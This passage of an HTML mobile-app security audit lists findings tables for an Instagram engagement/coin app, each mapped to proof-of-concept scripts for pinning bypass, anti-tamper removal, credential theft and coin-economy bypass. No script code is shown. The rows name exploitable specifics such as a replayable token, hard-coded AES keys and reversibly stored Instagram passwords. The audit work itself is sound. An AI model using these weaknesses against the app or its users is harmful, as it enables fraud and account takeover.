href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-13 ecdsa device-attestation key uses a fixed alias and a 25-year self-signed certificate medium integrity 10_java_crypto_layer.js 08_backend_traffic_and_servercheck.js"><td><a href="#INTE-13">INTE-13</a></td><td>ECDSA device-attestation key uses a fixed alias and a 25-year self-signed certificate</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" href="#script-10_java_crypto_layer">10_java_crypto_layer.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="inte-14 native anti-analysis relies on file reads and string matching; no ptrace, tracerpid, property_get, dlopen or timing checks exist medium integrity 01_anti_tamper_killer.js 07_native_jni_dumper.js"><td><a href="#INTE-14">INTE-14</a></td><td>Native anti-analysis relies on file reads and string matching; no ptrace, TracerPid, property_get, dlopen or timing checks exist</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="stor-05 get_image.php accepts a client-supplied image_url medium server-side 08_backend_traffic_and_servercheck.js"><td><a href="#STOR-05">STOR-05</a></td><td><code>get_image.php</code> accepts a client-supplied <code>image_url</code></td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Server-side</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="stor-08 captcha site keys come from native code and the token is signed client-side medium business logic 05_coin_economy_bypass.js"><td><a href="#STOR-08">STOR-08</a></td><td>CAPTCHA site keys come from native code and the token is signed client-side</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="stor-09 task-control service accepts an arbitrary account id with no authorisation check medium integrity 05_coin_economy_bypass.js"><td><a href="#STOR-09">STOR-09</a></td><td>Task-control service accepts an arbitrary account id with no authorisation check</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Integrity</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="stor-10 no client-side throttling on the money endpoints medium business logic 05_coin_economy_bypass.js 06_task_verification_bypass.js"><td><a href="#STOR-10">STOR-10</a></td><td>No client-side throttling on the money endpoints</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a> <a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="stor-12 login response parsed by substring matching on the raw json text medium instagram api 03_instagram_api_intercept.js 06_task_verification_bypass.js"><td><a href="#STOR-12">STOR-12</a></td><td>Login response parsed by substring matching on the raw JSON text</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a> <a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="stor-14 direct-message, threads and interop endpoints automated medium instagram api 03_instagram_api_intercept.js"><td><a href="#STOR-14">STOR-14</a></td><td>Direct-message, Threads and interop endpoints automated</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a></td></tr><tr data-search="tran-03 no networksecurityconfig declared medium transport 02_ssl_pinning_bypass.js"><td><a href="#TRAN-03">TRAN-03</a></td><td>No <code>networkSecurityConfig</code> declared</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Transport</td><td><a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a></td></tr><tr data-search="tran-04 response host/path verification is a native function over a client-held object medium transport 07_native_jni_dumper.js"><td><a href="#TRAN-04">TRAN-04</a></td><td>Response host/path verification is a native function over a client-held object</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Transport</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="tran-05 instagram private-api traffic multiplexed with backend traffic in one process medium transport 03_instagram_api_intercept.js 08_backend_traffic_and_servercheck.js"><td><a href="#TRAN-05">TRAN-05</a></td><td>Instagram private-API traffic multiplexed with backend traffic in one process</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Transport</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cred-10 firebase cloud project number and fcm token collected low data storage 08_backend_traffic_and_servercheck.js"><td><a href="#CRED-10">CRED-10</a></td><td>Firebase cloud project number and FCM token collected</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Data storage</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cryp-08 instagram urls hidden as triple-base64 in .rodata low native hardening 07_native_jni_dumper.js"><td><a href="#CRYP-08">CRYP-08</a></td><td>Instagram URLs hidden as triple-base64 in .rodata</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Native hardening</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="cryp-13 native aes is table-based with no armv8 crypto extension, so it is cache-timing exposed low cryptography 09_native_aes_dump.js"><td><a href="#CRYP-13">CRYP-13</a></td><td>Native AES is table-based with no ARMv8 Crypto Extension, so it is cache-timing exposed</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></td></tr><tr data-search="cryp-14 opaque 5-byte literal 'f3aes' embedded in the jni metadata cluster of all three abis and referenced by nothing low cryptography 09_native_aes_dump.js 07_native_jni_dumper.js"><td><a href="#CRYP-14">CRYP-14</a></td><td>Opaque 5-byte literal 'F3AES' embedded in the JNI metadata cluster of all three ABIs and referenced by nothing</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="inte-06 ollvm control-flow flattening as the sole native protection low native hardening 07_native_jni_dumper.js"><td><a href="#INTE-06">INTE-06</a></td><td>OLLVM control-flow flattening as the sole native protection</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Native hardening</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="inte-07 scrambled dex map_list to break static analysis tooling low anti-analysis 07_native_jni_dumper.js"><td><a href="#INTE-07">INTE-07</a></td><td>Scrambled DEX <code>map_list</code> to break static analysis tooling</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Anti-analysis</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="obfu-02 ollvm control-flow flattening only: .text entropy is 6.86, so the library is not packed low obfuscation 07_native_jni_dumper.js 09_native_aes_dump.js"><td><a href="#OBFU-02">OBFU-02</a></td><td>OLLVM control-flow flattening only: .text entropy is 6.86, so the library is not packed</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Obfuscation</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a> <a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></td></tr><tr data-search="stor-04 extractnativelibs=false leaves the packed .so directly accessible low data storage 07_native_jni_dumper.js"><td><a href="#STOR-04">STOR-04</a></td><td><code>extractNativeLibs=false</code> leaves the packed .so directly accessible</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Data storage</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="stor-06 crash reporting and analytics collect device and session data pre-consent low privacy 08_backend_traffic_and_servercheck.js"><td><a href="#STOR-06">STOR-06</a></td><td>Crash reporting and analytics collect device and session data pre-consent</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Privacy</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="stor-11 balances and activity exposed through notification text and reflected errors low data storage 06_task_verification_bypass.js"><td><a href="#STOR-11">STOR-11</a></td><td>Balances and activity exposed through notification text and reflected errors</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Data storage</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="stor-13 bloks/caa login flow with hard-coded instance and marker ids low instagram api 03_instagram_api_intercept.js"><td><a href="#STOR-13">STOR-13</a></td><td>Bloks/CAA login flow with hard-coded instance and marker ids</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a></td></tr><tr data-search="stor-16 small exported surface, but the launcher activity is world-reachable low attack surface 01_anti_tamper_killer.js"><td><a href="#STOR-16">STOR-16</a></td><td>Small exported surface, but the launcher activity is world-reachable</td><td><span class="badge" style="--c:#4dd7ff">Low</span></td><td>Attack surface</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr></tbody></table></div>
+<div class="tablewrap"><input class="tsearch" type="search" placeholder="Filter this table&hellip;" data-target="tbl-matrix"><table id="tbl-matrix" class="searchable"><thead><tr><th>ID</th><th>Title</th><th>Severity</th><th>Category</th><th>PoC</th></tr></thead><tbody><tr data-search="biz-01 coin reward flag get_coin is asserted by the client critical business logic 06_task_verification_bypass.js"><td><a href="#BIZ-01">BIZ-01</a></td><td>Coin reward flag <code>get_coin</code> is asserted by the client</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Business logic</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="biz-02 reward amount order_value travels from the client critical business logic 06_task_verification_bypass.js"><td><a href="#BIZ-02">BIZ-02</a></td><td>Reward amount <code>order_value</code> travels from the client</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Business logic</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="cred-01 instagram account password persisted on-device in a reversible cipher critical credentials 04_credential_theft.js"><td><a href="#CRED-01">CRED-01</a></td><td>Instagram account PASSWORD persisted on-device in a reversible cipher</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Credentials</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="cred-02 2fa seed / backup codes stored in the two_factors table critical credentials 04_credential_theft.js"><td><a href="#CRED-02">CRED-02</a></td><td>2FA seed / backup codes stored in the <code>two_factors</code> table</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Credentials</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="cred-03 webview cookie harvester synthesises an oauth bearer token from sessionid critical credentials 04_credential_theft.js"><td><a href="#CRED-03">CRED-03</a></td><td>WebView cookie harvester synthesises an OAuth bearer token from <code>sessionid</code></td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Credentials</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="cred-04 instagram session token sent to the vendor backend in a plaintext http header critical credentials 03_instagram_api_intercept.js 08_backend_traffic_and_servercheck.js"><td><a href="#CRED-04">CRED-04</a></td><td>Instagram session token sent to the vendor backend in a plaintext HTTP header</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Credentials</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cred-05 instagram login credentials forwarded to instagramlogin.php critical credentials 08_backend_traffic_and_servercheck.js"><td><a href="#CRED-05">CRED-05</a></td><td>Instagram login credentials forwarded to <code>instagramLogin.php</code></td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Credentials</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cryp-01 keyless static cipher used for all &amp;ldquo;encrypted&amp;rdquo; local secrets critical cryptography 04_credential_theft.js"><td><a href="#CRYP-01">CRYP-01</a></td><td>Keyless static cipher used for all &ldquo;encrypted&rdquo; local secrets</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Cryptography</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="cryp-15 literal aes key 0123456789abcdef stored in plaintext .rodata critical cryptography 09_native_aes_dump.js 07_native_jni_dumper.js"><td><a href="#CRYP-15">CRYP-15</a></td><td>Literal AES key <code>0123456789abcdef</code> stored in plaintext <code>.rodata</code></td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="cryp-16 all-zero aes-128-cbc key and iv hard-wired into func#30 (7 of 22 jni natives) critical cryptography 09_native_aes_dump.js 08_backend_traffic_and_servercheck.js"><td><a href="#CRYP-16">CRYP-16</a></td><td>All-zero AES-128-CBC key and IV hard-wired into <code>func#30</code> (7 of 22 JNI natives)</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cryp-17 static aes-192 key and two fixed 12-byte nonces behind a single xor byte critical cryptography 09_native_aes_dump.js 10_java_crypto_layer.js"><td><a href="#CRYP-17">CRYP-17</a></td><td>Static AES-192 key and two fixed 12-byte nonces behind a single XOR byte</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a> <a class="chip" href="#script-10_java_crypto_layer">10_java_crypto_layer.js</a></td></tr><tr data-search="stor-01 room database is unencrypted critical data storage 04_credential_theft.js"><td><a href="#STOR-01">STOR-01</a></td><td>Room database is unencrypted</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Data storage</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="stor-02 allowbackup=true with completely empty backup-exclusion rules critical data storage 04_credential_theft.js"><td><a href="#STOR-02">STOR-02</a></td><td><code>allowBackup=true</code> with completely empty backup-exclusion rules</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Data storage</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a></td></tr><tr data-search="tran-02 backend base url and pin are downloaded at runtime critical transport 08_backend_traffic_and_servercheck.js 02_ssl_pinning_bypass.js"><td><a href="#TRAN-02">TRAN-02</a></td><td>Backend base URL and pin are downloaded at runtime</td><td><span class="badge" style="--c:#ff3b6b">Critical</span></td><td>Transport</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a> <a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a></td></tr><tr data-search="biz-03 client-side price computation for buying engagement high business logic 05_coin_economy_bypass.js"><td><a href="#BIZ-03">BIZ-03</a></td><td>Client-side price computation for buying engagement</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="biz-04 set_order_stamp signature omits balance, currency and nonce high business logic 05_coin_economy_bypass.js"><td><a href="#BIZ-04">BIZ-04</a></td><td><code>set_order_stamp</code> signature omits balance, currency and nonce</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="biz-05 local wallet in an unencrypted room database is the balance of record for the ui high data storage 04_credential_theft.js 05_coin_economy_bypass.js"><td><a href="#BIZ-05">BIZ-05</a></td><td>Local wallet in an unencrypted Room database is the balance of record for the UI</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Data storage</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a> <a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="biz-06 static challenge token x4 accepted on the claim endpoint high business logic 06_task_verification_bypass.js"><td><a href="#BIZ-06">BIZ-06</a></td><td>Static challenge token <code>x4</code> accepted on the claim endpoint</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Business logic</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="biz-07 claim body built entirely on-device by native code with no server challenge high business logic 06_task_verification_bypass.js 07_native_jni_dumper.js"><td><a href="#BIZ-07">BIZ-07</a></td><td>Claim body built entirely on-device by native code with no server challenge</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Business logic</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="biz-08 mass multi-account farming worker with a client-controlled concurrency flag high instagram api 05_coin_economy_bypass.js 06_task_verification_bypass.js"><td><a href="#BIZ-08">BIZ-08</a></td><td>Mass multi-account farming worker with a client-controlled concurrency flag</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Instagram API</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a> <a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="biz-12 server-pushed update and download links are opened without verification high integrity 02_ssl_pinning_bypass.js 08_backend_traffic_and_servercheck.js"><td><a href="#BIZ-12">BIZ-12</a></td><td>Server-pushed update and download links are opened without verification</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Integrity</td><td><a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cred-06 hard-coded spoofed instagram client identity high instagram api 03_instagram_api_intercept.js"><td><a href="#CRED-06">CRED-06</a></td><td>Hard-coded spoofed Instagram client identity</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a></td></tr><tr data-search="cred-07 per-request forged x-ig-nav-chain / x-ig-salt-ids / x-fb-rmd high instagram api 03_instagram_api_intercept.js"><td><a href="#CRED-07">CRED-07</a></td><td>Per-request forged <code>x-ig-nav-chain</code> / <code>x-ig-salt-ids</code> / <code>x-fb-rmd</code></td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a></td></tr><tr data-search="cred-08 human-behaviour simulator with jittered timings and forced re-login high instagram api 03_instagram_api_intercept.js"><td><a href="#CRED-08">CRED-08</a></td><td>Human-behaviour simulator with jittered timings and forced re-login</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Instagram API</td><td><a class="chip" href="#script-03_instagram_api_intercept">03_instagram_api_intercept.js</a></td></tr><tr data-search="cryp-02 hard-coded 64-hex integrity constant reconstructed from nested base64 high cryptography 01_anti_tamper_killer.js"><td><a href="#CRYP-02">CRYP-02</a></td><td>Hard-coded 64-hex integrity constant reconstructed from nested base64</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Cryptography</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="cryp-03 static, fully replayable challenge blob x4 in every coin claim high business logic 06_task_verification_bypass.js"><td><a href="#CRYP-03">CRYP-03</a></td><td>Static, fully replayable challenge blob <code>x4</code> in every coin claim</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Business logic</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="cryp-04 certificate pin is the apk signing-certificate digest, and it is server-rotatable high transport 02_ssl_pinning_bypass.js 08_backend_traffic_and_servercheck.js"><td><a href="#CRYP-04">CRYP-04</a></td><td>Certificate pin is the APK signing-certificate digest, and it is server-rotatable</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Transport</td><td><a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cryp-05 no tls stack and no crypto imports in the native library pinning is java-side only high native hardening 02_ssl_pinning_bypass.js"><td><a href="#CRYP-05">CRYP-05</a></td><td>No TLS stack and no crypto <i>imports</i> in the native library &mdash; pinning is Java-side only</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Native hardening</td><td><a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a></td></tr><tr data-search="cryp-09 native aes-table cipher with an aes-256-shaped key expansion; block ciphers not validated under emulation, and unreachable from java high cryptography 09_native_aes_dump.js"><td><a href="#CRYP-09">CRYP-09</a></td><td>Native AES-table cipher with an AES-256-shaped key expansion; block ciphers not validated under emulation, and unreachable from Java</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></td></tr><tr data-search="cryp-10 native aes key is runtime-derived: it is not the caller's key and not a byte window of the file high cryptography 09_native_aes_dump.js"><td><a href="#CRYP-10">CRYP-10</a></td><td>Native AES key is runtime-derived: it is not the caller's key and not a byte window of the file</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Cryptography</td><td><a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></td></tr><tr data-search="cryp-12 the rsa public key that seals the password is supplied by the network at runtime and never validated high cryptography 10_java_crypto_layer.js 02_ssl_pinning_bypass.js 08_backend_traffic_and_servercheck.js"><td><a href="#CRYP-12">CRYP-12</a></td><td>The RSA public key that seals the password is supplied by the network at runtime and never validated</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Cryptography</td><td><a class="chip" href="#script-10_java_crypto_layer">10_java_crypto_layer.js</a> <a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cryp-19 func#36 : padding-oracle-shaped aes-ecb decrypt reachable as q.k high cryptography 07_native_jni_dumper.js 09_native_aes_dump.js"><td><a href="#CRYP-19">CRYP-19</a></td><td><code>func#36</code>: padding-oracle-shaped AES-ECB decrypt reachable as <code>q.k</code></td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Cryptography</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a> <a class="chip" href="#script-09_native_aes_dump">09_native_aes_dump.js</a></td></tr><tr data-search="inte-01 apk signature self-check is hookable at the java reflection layer high integrity 01_anti_tamper_killer.js"><td><a href="#INTE-01">INTE-01</a></td><td>APK signature self-check is hookable at the Java reflection layer</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Integrity</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-02 google play store certificate gate d8.f.a() forced open high integrity 01_anti_tamper_killer.js"><td><a href="#INTE-02">INTE-02</a></td><td>Google Play Store certificate gate <code>d8.f.a()</code> forced open</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Integrity</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-03 /proc/self/maps scan for frida, xposed, riru, zygisk and substrate high anti-analysis 01_anti_tamper_killer.js"><td><a href="#INTE-03">INTE-03</a></td><td><code>/proc/self/maps</code> scan for Frida, Xposed, Riru, Zygisk and Substrate</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Anti-analysis</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a></td></tr><tr data-search="inte-08 play integrity gate keyed on client-writable sharedpreferences high integrity 01_anti_tamper_killer.js 08_backend_traffic_and_servercheck.js"><td><a href="#INTE-08">INTE-08</a></td><td>Play Integrity gate keyed on client-writable SharedPreferences</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Integrity</td><td><a class="chip" href="#script-01_anti_tamper_killer">01_anti_tamper_killer.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="stor-03 sensitive values in sharedpreferences with reversible obfuscation high data storage 04_credential_theft.js 08_backend_traffic_and_servercheck.js"><td><a href="#STOR-03">STOR-03</a></td><td>Sensitive values in SharedPreferences with reversible obfuscation</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Data storage</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="stor-07 webview used for instagram login and hcaptcha with a js bridge high credentials 04_credential_theft.js 02_ssl_pinning_bypass.js"><td><a href="#STOR-07">STOR-07</a></td><td>WebView used for Instagram login and hCaptcha with a JS bridge</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Credentials</td><td><a class="chip" href="#script-04_credential_theft">04_credential_theft.js</a> <a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a></td></tr><tr data-search="stor-15 no user confirmation before credential-driven automation begins high privacy 06_task_verification_bypass.js"><td><a href="#STOR-15">STOR-15</a></td><td>No user confirmation before credential-driven automation begins</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Privacy</td><td><a class="chip" href="#script-06_task_verification_bypass">06_task_verification_bypass.js</a></td></tr><tr data-search="tran-01 certificate pinning defeated at the java layer high transport 02_ssl_pinning_bypass.js"><td><a href="#TRAN-01">TRAN-01</a></td><td>Certificate pinning defeated at the Java layer</td><td><span class="badge" style="--c:#ff8a3d">High</span></td><td>Transport</td><td><a class="chip" href="#script-02_ssl_pinning_bypass">02_ssl_pinning_bypass.js</a></td></tr><tr data-search="biz-09 vip upgrade gated only on locally available fields medium business logic 05_coin_economy_bypass.js"><td><a href="#BIZ-09">BIZ-09</a></td><td>VIP upgrade gated only on locally available fields</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="biz-10 coupon, gift-code and daily-reward redemption driven by the client medium business logic 05_coin_economy_bypass.js"><td><a href="#BIZ-10">BIZ-10</a></td><td>Coupon, gift-code and daily-reward redemption driven by the client</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a></td></tr><tr data-search="biz-11 invite, leaderboard and miner-request flows are client-editable medium business logic 05_coin_economy_bypass.js 08_backend_traffic_and_servercheck.js"><td><a href="#BIZ-11">BIZ-11</a></td><td>Invite, leaderboard and miner-request flows are client-editable</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Business logic</td><td><a class="chip" href="#script-05_coin_economy_bypass">05_coin_economy_bypass.js</a> <a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cred-09 android keystore ecdsa key under a hard-coded alias medium cryptography 07_native_jni_dumper.js"><td><a href="#CRED-09">CRED-09</a></td><td>Android Keystore ECDSA key under a hard-coded alias</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Cryptography</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="cred-11 dead jni bridge: native code looks up helper.t.digest([b)[b which does not exist in the dex medium credentials 10_java_crypto_layer.js 07_native_jni_dumper.js"><td><a href="#CRED-11">CRED-11</a></td><td>Dead JNI bridge: native code looks up helper.T.digest([B)[B which does not exist in the DEX</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Credentials</td><td><a class="chip" href="#script-10_java_crypto_layer">10_java_crypto_layer.js</a> <a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="cryp-06 base64-only obfuscation of endpoint paths and constants medium obfuscation 08_backend_traffic_and_servercheck.js"><td><a href="#CRYP-06">CRYP-06</a></td><td>Base64-only obfuscation of endpoint paths and constants</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Obfuscation</td><td><a class="chip" href="#script-08_backend_traffic_and_servercheck">08_backend_traffic_and_servercheck.js</a></td></tr><tr data-search="cryp-07 native string tables obfuscated with two single-byte xor keys medium native hardening 07_native_jni_dumper.js"><td><a href="#CRYP-07">CRYP-07</a></td><td>Native string tables obfuscated with two single-byte XOR keys</td><td><span class="badge" style="--c:#ffd23d">Medium</span></td><td>Native hardening</td><td><a class="chip" href="#script-07_native_jni_dumper">07_native_jni_dumper.js</a></td></tr><tr data-search="cryp-11 instagram password sealed with rsa pkcs#1 v1.5 rather than oaep medium cryptography 10_java_crypto_layer.js"><td><a href="#CRYP-11">CRYP-11</a></td><td>Instagram password sealed with RSA PKCS#1 v1.5 